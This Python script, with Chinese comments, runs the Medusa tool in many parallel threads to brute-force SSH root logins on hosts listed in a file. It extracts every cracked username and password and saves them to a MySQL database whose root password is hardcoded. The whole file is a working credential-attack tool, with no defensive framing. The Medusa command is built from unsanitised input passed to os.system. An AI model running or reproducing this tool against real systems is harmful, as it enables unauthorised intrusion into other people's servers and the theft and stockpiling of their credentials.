import os
import re
import pymysql
import threading


def store_mysql(ip_addr, username, password):
    conn = pymysql.connect(
        host='192.168.10.228',
        user='root',
        password='mkr961...',
        database='medusa',
        charset='utf8mb4',
        cursorclass=pymysql.cursors.DictCursor
    )
    try:
        with conn.cursor() as cursor:
            # 注意这里将表名改为了medusa，根据实际情况修改
            sql = "INSERT INTO `passwords` (`ip_addr`, `username`, `password`) VALUES (%s, %s, %s)"
            cursor.execute(sql, (ip_addr, username, password))
        conn.commit()
    finally:
        conn.close()


def crack_ssh(ip, user, password):
    cmd = f'medusa -h {ip} -u {user} -P pass.txt -O output.txt -M ssh -continue -T 4 -f -v 3'
    os.system(cmd)
    with open('output.txt', 'r') as f:
        for line in f.readlines():
            if 'ACCOUNT FOUND' in line:
                ip_addr = re.findall(r'\d+.\d+.\d+.\d+', line)[0]
                username = re.findall(r'User: (.*) Password:', line)[0]
                password = re.findall(r'Password: (.*) \[SUCCESS\]', line)[0]
                # 注意这里调用了store_mysql()函数，并将参数传入
                store_mysql(ip_addr, username, password)


if __name__ == '__main__':
    threads = []
    with open('ip.txt', 'r') as f:
        for line in f.readlines():
            # 注意这里修改了正则表达式
            match = re.match(r'(\d+\.\d+\.\d+\.\d+):(\d+)', line)
            if match:
                ip = match.group(1)
                num = int(match.group(2))
                for i in range(num):
                    user = 'root'
                    password = '123456'
                    # 注意这里创建了一个新的线程来执行crack_ssh()函数
                    t = threading.Thread(target=crack_ssh, args=(ip, user, password))
                    threads.append(t)
    for t in threads:
        t.start()
    for t in threads:
        t.join()
